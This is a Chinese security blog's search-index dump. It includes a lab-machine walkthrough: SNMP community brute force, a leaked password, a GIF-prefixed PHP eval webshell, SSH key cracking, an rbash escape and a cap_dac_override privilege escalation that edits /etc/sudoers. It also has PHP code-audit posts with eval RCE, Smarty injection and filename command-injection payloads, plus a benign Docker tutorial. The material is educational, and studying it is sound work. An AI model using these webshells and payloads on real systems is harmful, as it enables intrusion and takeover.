
[{"content":"","date":"28 September 2025","externalUrl":null,"permalink":"/","section":"IIIIIII的博客","summary":"","title":"IIIIIII的博客","type":"page"},{"content":"","date":"28 September 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"28 September 2025","externalUrl":null,"permalink":"/tags/rbash/","section":"Tags","summary":"","title":"Rbash","type":"tags"},{"content":" Maze-readfile靶机-作者：/-QQ群660930334 # 信息收集 # NMAP扫描端口 TCP\n这里发现一个80我们访问发现是一个flatpress的博客界面 他有一个目录遍历的漏洞\n┌──(root㉿kali)-[/linepas]\r└─# nmap 172.20.10.3 -p- Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-28 00:29 EDT\rNmap scan report for wordpress.local (172.20.10.3)\rHost is up (0.00030s latency).\rNot shown: 65533 closed tcp ports (reset)\rPORT STATE SERVICE\r22/tcp open ssh\r80/tcp open http\rMAC Address: 08:00:27:BE:6E:41 (Oracle VirtualBox virtual NIC) 这个博客有一个目录遍历漏洞我看作者提示叫我们翻文件我就去翻呗翻到密码就拿下webshell了\n到网上找到了他的系统架构\rflatpress/\r├── admin/\r├── docs/\r├── fp-content/\r├── fp-defaults/\r├── fp-includes/\r├── fp-interface/\r├── fp-plugins/\r├── setup/\r├── .gitignore\r├── CHANGELOG.md\r├── CONTRIBUTORS.md\r├── LICENSE.md\r├── README.md\r├── SECURITY.md\r├── admin.php\r├── blog.php\r├── comments.php\r├── contact.php\r├── defaults.php\r├── get.php\r├── index.php\r├── login.php\r├── rss.php\r├── search.php\r├── setup.php\r├── sitemap.php\r└── static.php 结果啥都没有发现\n一般这个时候就是信息收集不对了\n一般我UDP扫描前100个 但是就是这个出现了问题\n可以发现出现了snmp 简单网络管理协议\nNot shown: 198 closed udp ports (port-unreach)\rPORT STATE SERVICE\r68/udp open|filtered dhcpc\r161/udp open snmp\rMAC Address: 08:00:27:BE:6E:41 (Oracle VirtualBox virtual NIC) 这个协议交互需要一个类似密钥通过软件来爆破\n发现密钥hello\n└─# onesixtyone -c /usr/share/john/password.lst 172.20.10.3 -w 64 Scanning 1 hosts, 3656 communities\r172.20.10.3 [hello] Linux readfile 5.15.0-156-generic #166-Ubuntu SMP Sat Aug 9 00:02:46 UTC 2025 x86_64 然后我们来翻文件\n翻到了密码\n.1.3.6.1.4.1.8072.1.3.2 这个 OID 并不属于标准的公共 MIB（管理信息库），而是属于 IANA（互联网号码分配局）维护的 \u0026ldquo;私有实验性 MIB\u0026rdquo; 范围\nsnmpwalk -v2c -c hello 172.20.10.3 发现没什么\r─# snmpwalk -v2c -c hello -On 172.20.10.3 .1.3.6.1.4.1.8072.1.3.2\r.1.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 1\r.1.3.6.1.4.1.8072.1.3.2.2.1.2.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = STRING: \u0026#34;/bin/bash\u0026#34;\r.1.3.6.1.4.1.8072.1.3.2.2.1.3.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = STRING: \u0026#34;/usr/local/bin/get_password_info.sh\u0026#34;\r.1.3.6.1.4.1.8072.1.3.2.2.1.4.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = \u0026#34;\u0026#34;\r.1.3.6.1.4.1.8072.1.3.2.2.1.5.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 5\r.1.3.6.1.4.1.8072.1.3.2.2.1.6.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 1\r.1.3.6.1.4.1.8072.1.3.2.2.1.7.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 1\r.1.3.6.1.4.1.8072.1.3.2.2.1.20.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 4\r.1.3.6.1.4.1.8072.1.3.2.2.1.21.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 1\r.1.3.6.1.4.1.8072.1.3.2.3.1.1.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = STRING: \u0026#34;Please change your old password mini:hereismyP@ssword!\u0026#34;\r.1.3.6.1.4.1.8072.1.3.2.3.1.2.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = STRING: \u0026#34;Please change your old password mini:hereismyP@ssword!\u0026#34;\r.1.3.6.1.4.1.8072.1.3.2.3.1.3.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 1\r.1.3.6.1.4.1.8072.1.3.2.3.1.4.13.112.97.115.115.119.111.114.100.95.108.101.97.107 = INTEGER: 0\r.1.3.6.1.4.1.8072.1.3.2.4.1.2.13.112.97.115.115.119.111.114.100.95.108.101.97.107.1 = STRING: \u0026#34;Please change your old password mini:hereismyP@ssword!\u0026#34; 登录进去上传文件 这里头加一个gif头可以绕过\nGIF89a;\r\u0026lt;?php\reval($_POST[\u0026#34;pass\u0026#34;]);\r然后用哥斯拉连接 拿到用户shell # 进去发现执行不了命令但是我们可以读取文件\ncurrentDir:/var/www/html/fp-content/attachs/\rfileRoot:[/]\rcurrentUser:www-data\rosInfo:Linux readfile 5.15.0-156-generic #166-Ubuntu SMP Sat Aug 9 00:02:46 UTC 2025 x86_64\r/var/www/html/fp-content/attachs/ \u0026gt;\rNULL\r/var/www/html/fp-content/attachs/ \u0026gt;ls\rnone of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock/pcntl_exec is available\r/var/www/html/fp-content/attachs/ \u0026gt; 发现用户mini里面有.ssh文件并且还有auxx文件我们可以直接登录下载文件到本地并且ssh密钥爆破\n└─# chmod 600 /root/id_rsa\r┌──(root㉿kali)-[~/generate_by_username]\r└─# ssh mini@172.20.10.3 -i /root/id_rsa\rEnter passphrase for key \u0026#39;/root/id_rsa\u0026#39;: 发现要密码我们再ssh2john爆破\r─# ssh2john /root/id_rsa /root/id_rsa:$sshng$6$16$6cf6117d7ba0438249294d07880575a7$1910$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000106cf6117d7ba0438249294d07880575a7000000100000000100000197000000077373682d727361000000030100010000018100cc2cfb1756296a5f58406eb987bb4cbeafa8af7e589792a7e57a30b483ad6c5caea9e175da9757f9e7811xxxxxxx 再用john\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt john.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\rCost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes\rCost 2 (iteration count) is 16 for all loaded hashes\rWill run 2 OpenMP threads\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\rilovehim (/root/id_rsa) 登录用户拿到user\nssh mini@172.20.10.3 -i /root/id_rsa\r输入密码ilovehim\rNew release \u0026#39;24.04.3 LTS\u0026#39; available.\rRun \u0026#39;do-release-upgrade\u0026#39; to upgrade to it.\rLast login: Sat Sep 27 09:25:25 2025 from 172.20.10.11\rmini@readfile:~$ 提权 # 这里说了进入到了rbash里面\n禁止切换目录：不能使用cd命令，也无法通过PATH或环境变量切换到其他目录。\r禁止修改环境变量：PATH、HOME等环境变量被固定，无法通过export等命令修改。\r禁止执行外部命令：只能运行PATH中指定目录的命令，且不能使用绝对路径（如/bin/ls）或相对路径（如./script.sh）执行程序。\r禁止重定向和管道：无法使用\u0026gt;、\u0026lt;、\u0026gt;\u0026gt;等重定向符号，也不能使用|管道符。\r禁止使用某些 bash 特性：如别名（alias）定义、函数定义、背景执行（\u0026amp;）、命令替换（$(...)）等。 mini@readfile:~$ cat lo-rbash: /dev/null: restricted: cannot redirect output\rbash_completion: _upvars: `-a2\u0026#39;: invalid number specifier\r-rbash: /dev/null: restricted: cannot redirect output\rbash_completion: _upvars: `-a0\u0026#39;: invalid number specifier 跳出rbash输入命令\nc\rmini@readfile:~$ bash -p -i\rDebian-snmp:x:114:120::/var/lib/snmp:/bin/false\rmini@readfile:~$ mini@readfile:~$ bash -p -i\rmini@readfile:~$ whoami\rmini\rmini@readfile:~$ ls\rlocal.txt\rmini@readfile:~$ cd /\rmini@readfile:/$ pwd\r/\rmini@readfile:/$ 你跳出rbash的核心操作是bash -i—— 通过启动一个新的交互式 bash shell，绕过了原rbash的受限环境。这本质上是目标系统rbash配置不严格导致的，允许用户直接调用未受限的bash程序 用提权软件来扫描\n发现一个/usr/bin/python3.10 cap_dac_override=ep 这里标红了\nLinux 能力机制将 root 用户的超级权限拆分为一系列独立的 “能力”，进程可以只拥有完成任务所需的特定能力，而无需拥有完整的 root 权限。例如：\rCAP_DAC_OVERRIDE：绕过文件的 discretionary access control (DAC) 检查（简单说，就是可以读写 / 执行任何文件，忽略文件的所有者和权限位限制）。\rCAP_NET_RAW：允许创建原始网络套接字（用于抓包等操作）。\r2. cap_dac_override=ep 的含义\r这是设置进程能力的语法，格式为 [能力名称]=[标志]，其中：\rcap_dac_override：指定要赋予的能力（如上面所说，用于绕过文件权限检查）。\rep：是能力的标志位组合：\re（Effective）：该能力处于 “生效” 状态，进程当前可以使用这个能力。\rp（Permitted）：该能力被 “允许”，进程可以在需要时将其切换为生效状态（e 标志依赖 p 标志）。\r/usr/bin/python3.10 cap_dac_override=ep 通常是在启动 python3.10 进程时，为其赋予 CAP_DAC_OVERRIDE\r所以可以不看比如root权限\r直接绕过文件权限检查\r无需切换到 root 用户\rcap_dac_override 是 Linux 中 “文件访问权限” 的 “超级通行证”，拥有它的进程可以无视文件的所有者和权限位，直接操作包括 root 所有的文件。这也是为什么该能力被视为高风险权限，滥用会严重威胁系统安全。 读取列表\n/usr/bin/python3.10 -c \u0026lsquo;import os;print(os.listdir(\u0026quot;/root\u0026quot;))\u0026rsquo;\nmini@readfile:/$ /usr/bin/python3.10 -c \u0026#39;import os;print(os.listdir(\u0026#34;/root\u0026#34;))\u0026#39;\r[\u0026#39;proof.txt\u0026#39;, \u0026#39;.bashrc\u0026#39;, \u0026#39;.Xauthority\u0026#39;, \u0026#39;.bash_history\u0026#39;, \u0026#39;.cache\u0026#39;]\rmini@readfile:/$ 读取文件\n/usr/bin/python3.10 -c \u0026lsquo;print(open(\u0026quot;/root/proof.txt\u0026quot;).read())\u0026rsquo;\nmini@readfile:/$ /usr/bin/python3.10 -c \u0026#39;print(open(\u0026#34;/root/proof.txt\u0026#34;).read())\u0026#39;\r15ea28dcdd363fbb1feaf8798cffee17 写入文件到/etc/sudoers\nmini@readfile:/$ /usr/bin/python3.10 -c \u0026#34;with open(\u0026#39;/etc/sudoers\u0026#39;,\u0026#39;a\u0026#39;)as f:\rf.write(\u0026#39;mini ALL=(ALL:ALL) NOPASSWD: ALL\\n\u0026#39;)\u0026#34;\rmini@readfile:/$ sudo -l\rMatching Defaults entries for mini on readfile:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser mini may run the following commands on readfile:\r(ALL : ALL) NOPASSWD: ALL\rmini@readfile:/$ 解释下\r第一个all 哪些位置可以用\r第二个all 可切换的用户\r第三个all 可切换的组\r第三个all 可执行的命令 登录root\nmini@readfile:/$ sudo su root\rroot@readfile:/# root@readfile:/# ls -al 总结 # 文件配置在\nextend password_leak /bin/bash /usr/local/bin/get_password_info.sh\rroot@readfile:~# cat /usr/local/bin/get_password_info.sh\r#!/bin/bash\recho \u0026#34;Please change your old password mini:hereismyP@ssword!\u0026#34;\rroot@readfile:~# cat /etc/snmp/snmpd.conf\r引入指定目录下的所有配置文件（类似 snmpd.conf.d 目录中的文件会被自动加载）。\rincludeDir /etc/snmp/snmpd.conf.d\rextend password_leak /bin/bash /usr/local/bin/get_password_info.sh\r过 extend 指令创建自定义 SNMP 扩展，将脚本 /usr/local/bin/get_password_info.sh 的输出挂载到 SNMP 的 OID 上。 1 SNMP（简单网络管理协议）：用于网络设备监控和管理的协议，常见版本有 v1、v2c（社区字符串认证）、v3（加密和认证）。\r2 社区字符串（Community String）：v1/v2c 中的认证凭证，类似密码，rocommunity为只读权限，rwcommunity为读写权限（如hello是你使用的只读字符串）。\r3 OID（对象标识符）：SNMP 中标识监控项的唯一路径，采用树状结构（如.1.3.6.1.4.1.8072.1.3.2是 net-snmp 扩展功能的默认路径）。\r4 net-snmp 扩展功能：通过extend指令在 snmpd.conf 中配置，可将自定义脚本输出挂载到特定 OID，实现自定义监控项（如泄露密码信息）。\r5 snmpwalk 命令：用于遍历 SNMP 代理的 OID 树，格式为snmpwalk -v版本 -c社区字符串 目标IP [OID]，可获取指定 OID 的信息。\r实验性 OID（.8072）：IANA 预留的用于测试的企业 ID，常被 net-snmp 等工具用于自定义扩展，非官方标准 OID。\r6 SNMP 安全风险：弱社区字符串、错误配置的扩展 OID 可能泄露敏感信息（如密码、系统数据），v1/v2c 传输不加密，存在窃听风险。\rLinux capabilities（能力机制）：将 root 权限拆分为细粒度特权，进程可仅获取必要权限（如cap_dac_override允许绕过文件权限检查）。\r7 cap_dac_override=ep：为进程赋予绕过文件 DAC 权限检查的能力，允许访问 / 修改原本无权限的文件（包括 root 所有文件）。\r8 rbash（受限 bash）：限制用户操作，如禁止cd、修改环境变量、使用绝对路径执行命令，可通过bash -i等方式突破（依赖配置缺陷）。\r9 /etc/sudoers配置：控制用户sudo权限，格式为用户名 主机=(用户:组) 命令，NOPASSWD:关键字可实现免密执行。\r10 Bash 引号规则：单引号（\u0026#39;）内内容完全原样保留，不可嵌套单引号；双引号（\u0026#34;）内解析变量，可包含单引号，避免语法冲突。 ","date":"28 September 2025","externalUrl":null,"permalink":"/posts/readfile/","section":"Posts","summary":"","title":"readfile靶机-maze-snmp-rbash-能力机制","type":"posts"},{"content":"","date":"28 September 2025","externalUrl":null,"permalink":"/tags/smtp/","section":"Tags","summary":"","title":"Smtp","type":"tags"},{"content":"","date":"28 September 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":" MVC-PHP代码审计-RCE-审计-版本对比工具 # 先判断是不是MVC\r找到具体的文件进行判断\r搞清楚路由\r搞清楚配置文件\r搞清楚是否是开发框架如 TP YII 如是则用已知漏洞来打 案例一lmx1.4RCE-读取数据库造成RCE # 代码关键位置在admin文件夹下面的AcquisiAction.class.php\n关键代码\n我们访问应该admin.php?m=Acquisi\u0026amp;a=showCjData\u0026amp;cid=1\u0026amp;lid=1\u0026amp;id=1\n记得往数据库里面放东西\npublic function showCjData(){\r$cjData = $this-\u0026gt;model-\u0026gt;getOneCjData($this-\u0026gt;lid);\r$jdData = $this-\u0026gt;model-\u0026gt;getOne($this-\u0026gt;id);\r$fieldData = $GLOBALS[\u0026#39;allfield\u0026#39;][$jdData[\u0026#39;mid\u0026#39;]];\r$temdata = $this-\u0026gt;model-\u0026gt;caijiDataOne($_GET[\u0026#39;cid\u0026#39;]);\r$this-\u0026gt;smarty-\u0026gt;assign(\u0026#39;jdData\u0026#39;,$jdData);\r$this-\u0026gt;smarty-\u0026gt;assign(\u0026#39;cjData\u0026#39;,$cjData);\r$fieldData = tool::arrV2K($fieldData,\u0026#39;fname\u0026#39;);\reval(\u0026#39;$data = \u0026#39;.$temdata[\u0026#39;data\u0026#39;].\u0026#39;;\u0026#39;);\rcaijiDataone是一个sql语句查询id id=$cid\rpublic function caijiDataOne($id){\r$this-\u0026gt;cj_data_tab();\r$param[\u0026#39;where\u0026#39;] = \u0026#39;id=\u0026#39;.$id;\rreturn parent::oneModel($param);\r}\r是不是我们先传入数据到数据库然后会放到eval执行以php执行就变成了RCE了呢我们先杀死hi 当的数据库有php代码他也会执行\n总结\n$temdata=select * from lmx_cj_data where id = xx 是一个数组\n下面取出数组中的data来执行\neval(\u0026rsquo;$data = \u0026lsquo;.$temdata[\u0026lsquo;data\u0026rsquo;].\u0026rsquo;;\u0026rsquo;);读取的是数据库中的data字段\n通过eval()执行 \u0026quot;$data = 数组字符串;\u0026quot;\nlmx1.4RCE-后台ssti注入-smart语法 # 看代码发现plug下面有使用smart插件\n加入到index.html最后\n\u0026lt;{include file=\u0026ldquo;c://windows/win.ini\u0026rdquo;}\u0026gt; 读取文件\n\u0026lt;{php}\u0026gt;phpinfo();\u0026lt;{/php}\u0026gt; 执行php代码\n代码审计对比工具 # 当你在代码审计发现不同版本时候可以用工具来对比代码\nWinMerge-2.16.50.2-x64-Setup\n还记得前台的sql注入吗 这里清除的看到了直接对GET进行过滤还没到数据库里面就没了\n案例2-baijiacms-RCE\u0026ndash;命令执行 # baijiacmsV4-4.1.4\\includes\\baijiacms\\common.inc.php\nhttps://www.cnvd.org.cn/flaw/show/CNVD-2021-12800\n安装用5版本的php 安装麻烦死了\n搜索system( 看到一个文件叫common.inc.php\nfunction file_save($file_tmp_name,$filename,$extention,$file_full_path,$file_relative_path,$allownet=true)\r{\r$settings=globaSystemSetting();\rif(!file_move($file_tmp_name, $file_full_path)) {\rreturn error(-1, \u0026#39;保存上传文件失败\u0026#39;);\r}\rif(!empty($settings[\u0026#39;image_compress_openscale\u0026#39;]))\r{\r$scal=$settings[\u0026#39;image_compress_scale\u0026#39;];\r$quality_command=\u0026#39;\u0026#39;;\rif(intval($scal)\u0026gt;0)\r{\r$quality_command=\u0026#39; -quality \u0026#39;.intval($scal);\r}\rsystem(\u0026#39;convert\u0026#39;.$quality_command.\u0026#39; \u0026#39;.$file_full_path.\u0026#39; \u0026#39;.$file_full_path);\r}\rintval是否整数\u0026gt;0 让他小于0\r$settings[\u0026#39;image_compress_openscale\u0026#39;不为空 然后我们看到这个system这时候分析函数变量是否可控\n1：$quality_command这个变量不行因为=空了 而且是数字没什么用啊\n​ 那我们就看file_full_path 也就是函数的第四个\n​\t同时if(!empty($settings[\u0026lsquo;image_compress_openscale\u0026rsquo;])) 不为空\n2： 然后我们点击谁引用了发现-\u0026gt;\nsystem/weixin/class/web/setting.php引用了\n它满足了第四个变量可控\n$extention = pathinfo($file[\u0026#39;name\u0026#39;], PATHINFO_EXTENSION);\r$extention=strtolower($extention);\rif($extention==\u0026#39;txt\u0026#39;)\r{\r$substr=substr($_SERVER[\u0026#39;PHP_SELF\u0026#39;], 0, strrpos($_SERVER[\u0026#39;PHP_SELF\u0026#39;], \u0026#39;/\u0026#39;));\rif(empty( $substr))\r{\r$substr=\u0026#34;/\u0026#34;;\t}\r$verify_root= substr(WEB_ROOT.\u0026#34;/\u0026#34;,0, strrpos(WEB_ROOT.\u0026#34;/\u0026#34;, $substr)).\u0026#34;/\u0026#34;;\r//file_save($file[\u0026#39;tmp_name\u0026#39;],$file[\u0026#39;name\u0026#39;],$extention,$verify_root.$file[\u0026#39;name\u0026#39;],$verify_root.$file[\u0026#39;name\u0026#39;],false);\rfile_save($file[\u0026#39;tmp_name\u0026#39;],$file[\u0026#39;name\u0026#39;],$extention,WEB_ROOT.\u0026#34;/\u0026#34;.$file[\u0026#39;name\u0026#39;],WEB_ROOT.\u0026#34;/\u0026#34;.$file[\u0026#39;name\u0026#39;],false);\r3：那我们怎么访问这个页面呢\n对应了system -\u0026gt; manager - \u0026gt; template - \u0026gt; web - \u0026gt; store_display\nhttp://localhost:906/index.php?mod=site\u0026amp;act=manager\u0026amp;do=store\u0026amp;op=display\u0026amp;beid=1 这是根目录\nsystem/weixin/class/web/setting.php要到这个地方\nhttp://localhost:906/index.php?mod=site\u0026amp;act=weixin\u0026amp;do=setting\n果然看到了一个文件上传的地方\n同时要满足不为空 -\u0026gt;通过引用了找到这个文件\nsystem/manager/template/web/netattach.php\n构造访问目录\nhttp://localhost:906/index.php?mod=site\u0026amp;act=manager\u0026amp;do=netattach\n可以发现设置为1可以不为空所以我们把功能打开\n利用过程 # 通过上传后抓包\nif($extention==\u0026#39;txt\u0026#39;) 首先后缀是txt才能过去\r他直接拼接我们上传的名字我们可以用连接符\r如whoami \u0026amp; ipconfig\r如 1231321321333333\u0026amp;\u0026amp;whoami 虽然前面报错但是后面依旧执行\r所以我们发包\rContent-Disposition: form-data; name=\u0026#34;weixin_verify_file\u0026#34;; filename=\u0026#34;\u0026amp;calc\u0026amp;.txt\u0026#34; 修改后看会不会弹出\r可以发现直接弹出了计算器\n传入 \u0026amp;calc\u0026amp; 会执行 calc，无需额外引号（因为原代码没有用引号包裹变量）； ","date":"27 September 2025","externalUrl":null,"permalink":"/posts/code4phpmvc/","section":"Posts","summary":"","title":"MVC-PHP代码审计2","type":"posts"},{"content":"","date":"27 September 2025","externalUrl":null,"permalink":"/tags/php/","section":"Tags","summary":"","title":"Php","type":"tags"},{"content":"","date":"26 September 2025","externalUrl":null,"permalink":"/tags/dockerfile/","section":"Tags","summary":"","title":"Dockerfile","type":"tags"},{"content":" Dockerfile-使用-docker语法-docker-compose # dockerfile # Dockerfile 是一个文本文件，包含了构建 Docker 镜像的所有指令。\rDockerfile 是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明。\r通过定义一系列命令和参数，Dockerfile 指导 Docker 构建一个自定义的镜像 我们创建一个基础dockcerfile文件并写入内容\n[root@iZbp156z1grx9b9s1305p0Z test]# cd dockertest/\r[root@iZbp156z1grx9b9s1305p0Z dockertest]# ls\rDockerfile\r[root@iZbp156z1grx9b9s1305p0Z dockertest]# ls -al\rtotal 12\rdrwxr-xr-x 2 root root 4096 Sep 25 23:01 .\rdrwxr-xr-x 3 root root 4096 Sep 25 22:37 ..\r-rw-r--r-- 1 root root 63 Sep 25 23:01 Dockerfile\r[root@iZbp156z1grx9b9s1305p0Z dockertest]# cat Dockerfile FROM nginx\rRUN echo \u0026#34;apache\u0026#34; \u0026gt;/usr/share/nginx/html/index.html\r[root@iZbp156z1grx9b9s1305p0Z dockertest]# pwd\r/root/test/dockertest\r[root@iZbp156z1grx9b9s1305p0Z dockertest]# FROM nginx 表示镜像名字\rRUN echo \u0026#34;apache\u0026#34; \u0026gt;/usr/share/nginx/html/index.html 执行的命令 然后我们build相当于pull了下来 名字是nginxtest9.26 描述v3\n[root@iZbp156z1grx9b9s1305p0Z dockertest]# pwd\r/root/test/dockertest\r[root@iZbp156z1grx9b9s1305p0Z dockertest]# docker build -t nginxtest9.26:v3 .\r[+] Building 0.7s (6/6) FINISHED xxx\r=\u0026gt; [1/2] FROM docker.io/library/nginx:latest@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31 xxxx\r[root@iZbp156z1grx9b9s1305p0Z dockertest]# 输入命令doker images 查看镜像状态\n[root@iZbp156z1grx9b9s1305p0Z dockertest]# docker images\rREPOSITORY TAG IMAGE ID CREATED SIZE\rnginx test2 d5acce9a304d 12 hours ago 141MB\rnginxtest9.26 v3 d5acce9a304d 12 hours ago 141MB\rnginx v3 7b28ab7a3fa3 13 hours ago 141MB 启动镜像\n[root@iZbp156z1grx9b9s1305p0Z dockertest]# docker run -d -p 8050:80 d5acce9a304d\r17f22daa865341ac328394b9d51c1ebbbea770a8b4173b0dd1da2dca9f579ae6\r[root@iZbp156z1grx9b9s1305p0Z dockertest]# 这里我两个ID相同因为\n镜像 ID 由内容（分层）决定，而非标签 ——内容不变，ID 就不变。你看到的多个镜像 ID 相同，是因为它们共享完全相同的分层数据，只是标签不同（相当于给同一个文件贴了多个文件名标签）。\r如果想生成新 ID 的镜像，需要实际修改镜像内容（比如修改 Dockerfile 指令、修改 index.html 内容、更换基础镜像版本等），这样构建时才会生成新的分层和新的镜像 ID。 如果你run 想设置两个命令可以如\nDocker 镜像采用 “分层存储” 机制，每一条 Dockerfile 指令（如 RUN、COPY、ADD 等）都会生成一个新的只读层，这些层叠加起来构成最终的镜像。如果存在过多无意义的层，会导致镜像体积膨胀，原因可以通过具体例子理解：\nFROM centos\rRUN yum -y install wget \\\r\u0026amp;\u0026amp; wget -O redis.tar.gz \u0026#34;http://download.redis.io/releases/redis-5.0.3.tar.gz\u0026#34; \\\r\u0026amp;\u0026amp; tar -xvf redis.tar.gz\r不要 因为每执行一次都会在 docker 上新建一层。所以过多无意义的层，会造成镜像膨胀过大\rFROM centos\rRUN yum -y install wget\rRUN wget -O redis.tar.gz \u0026#34;http://download.redis.io/releases/redis-5.0.3.tar.gz\u0026#34;\rRUN tar -xvf redis.tar.gz 解释file命令语法 # CMD\n类似于 RUN 指令，用于运行程序，但二者运行的时间点不同:\rCMD 在docker run 时运行。\rRUN 是在 docker build。 EXPOSE\n帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射。\r在运行时使用随机端口映射时，也就是 docker run -P 时，会自动随机映射 EXPOSE 的端口。 docker-compose # Dockerfile 是 “造零件（镜像）”，docker-compose 是 “装机器（多容器应用）”。\n[root@iZbp156z1grx9b9s1305p0Z dockertest]# cat docker-compose.yml version: \u0026#39;3.8\u0026#39; # 指定docker-compose版本\rservices:\r# 定义Nginx服务，名称为nginx-test\rnginx-test:\rbuild: . # 表示从当前目录的Dockerfile构建镜像\rports:\r- \u0026#34;8080:80\u0026#34; # 端口映射：主机的8080端口映射到容器的80端口（Nginx默认端口）\rcontainer_name: my-nginx-container # 容器名称，方便识别\rrestart: unless-stopped # 重启策略：除非手动停止，否则总是重启\r# 可选：挂载目录（如果需要实时修改index.html内容，可以添加以下配置）\r# volumes:\r# - ./index.html:/usr/share/nginx/html/index.html\r[root@iZbp156z1grx9b9s1305p0Z dockertest]# build: . 从dockerfile搭建 然后输入命令\ndocker-commpose up -d -d表示在后台运行\n[root@iZbp156z1grx9b9s1305p0Z dockertest]# ls\rDockerfile\r[root@iZbp156z1grx9b9s1305p0Z dockertest]# docker-compose up -d\r/usr/local/lib/python3.6/site-packages/paramiko/transport.py:32: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography. The next release of cryptography will remove support for Python 3.6.\rfrom cryptography.hazmat.backends import default_backend\rCreating network \u0026#34;dockertest_default\u0026#34; with the default driver\rBuilding nginx-test\r[+] Building 0.7s (6/6) FINISHED docker:default\rxx\r=\u0026gt; [1/2] FROM docker.io/library/nginx:latest@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31 xxx\rWARNING: Image for service nginx-test was built because it did not already exist. To rebuild this image you must use `docker-compose build` or `docker-compose up --build`.\rCreating my-nginx-container ... done\r[root@iZbp156z1grx9b9s1305p0Z dockertest]# docer ps\r-bash: docer: command not found\r[root@iZbp156z1grx9b9s1305p0Z dockertest]# docker ps\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\r6423922c9200 dockertest_nginx-test \u0026#34;/docker-entrypoint.…\u0026#34; 8 seconds ago Up 7 seconds 0.0.0.0:8080-\u0026gt;80/tcp, :::8080-\u0026gt;80/tcp my-nginx-container\r17f22daa8653 d5acce9a304d \u0026#34;/docker-entrypoint.…\u0026#34; 13 minutes ago Up 13 minutes 0.0.0.0:8050-\u0026gt;80/tcp, :::8050-\u0026gt;80/tcp 发现镜像名字dockertest_nginx-test成功搭建了通过docker-compose\n","date":"26 September 2025","externalUrl":null,"permalink":"/posts/dockerfile/","section":"Posts","summary":"","title":"Dockerfile-使用-docker语法","type":"posts"},{"content":" MVC-PHP代码审计- # 先判断是不是MVC\r找到具体的文件进行判断\r搞清楚路由\r搞清楚配置文件\r搞清楚是否是开发框架如 TP YII 如是则用已知漏洞来打 MVC模型 # 分为控制层 服务层 视图层\n也有前后端交互的MVC只提供接口是目前的主流，然后前端如VUE来动态渲染\n判断MVC模型 # http://localhost:905/index.php?m=list\u0026amp;a=index\u0026amp;classid=1\n比如这种m=xxa=xxclassid=xx\n但是index.php根本没有这种GET\n\u0026lt;?php /**\r* 【梦想cms】 http://www.lmxcms.com\r* * 前台入口文件\r*/\rdefine(\u0026#39;LMXCMS\u0026#39;,TRUE);\rdefine(\u0026#39;RUN_TYPE\u0026#39;,\u0026#39;index\u0026#39;);\rrequire dirname(__FILE__).\u0026#39;/inc/config.inc.php\u0026#39;;\rrequire dirname(__FILE__).\u0026#39;/inc/run.inc.php\u0026#39;;\r?\u0026gt; 正确是在index文件夹\u0026gt;listAction.class.php-\u0026gt;index方法-\u0026gt;classid传参\n所以是Index.php开头指定在index文件夹\n所以list=文件名字 index=方法 classid=参数\nListAction.class.php内容如下\r\u0026lt;?php /**\r* 【梦想cms】 http://www.lmxcms.com\r* * 前台栏目页面控制器\r*/\rdefined(\u0026#39;LMXCMS\u0026#39;) or exit();\rclass ListAction extends HomeAction{\rprivate $classid;\rpublic function __construct(){\rparent::__construct();\r$this-\u0026gt;classid = (int)$_POST[\u0026#39;classid\u0026#39;] ? (int)$_POST[\u0026#39;classid\u0026#39;] : (int)$_GET[\u0026#39;classid\u0026#39;];\rif(!$this-\u0026gt;classid || !isset($GLOBALS[\u0026#39;allclass\u0026#39;][$this-\u0026gt;classid])){\r_404();\r}\rif($GLOBALS[\u0026#39;allclass\u0026#39;][$this-\u0026gt;classid][\u0026#39;classtype\u0026#39;] == 2){\r//外部链接直接跳转\rrewrite::php_url($GLOBALS[\u0026#39;allclass\u0026#39;][$this-\u0026gt;classid][\u0026#39;classurl\u0026#39;]);\r}\r}\rpublic function index(){\r$temModel = new parse($this-\u0026gt;smarty);\rif($GLOBALS[\u0026#39;allclass\u0026#39;][$this-\u0026gt;classid][\u0026#39;classtype\u0026#39;] == 0){\r$model = new ContentModel($this-\u0026gt;classid);\r}else if($GLOBALS[\u0026#39;allclass\u0026#39;][$this-\u0026gt;classid][\u0026#39;classtype\u0026#39;] == 1){\r$model = new ColumnModel();\r}\recho $temModel-\u0026gt;lists($this-\u0026gt;classid,$model);\r}\r}\r?\u0026gt; 案例lmxcms1.4-前台Sql注入 # 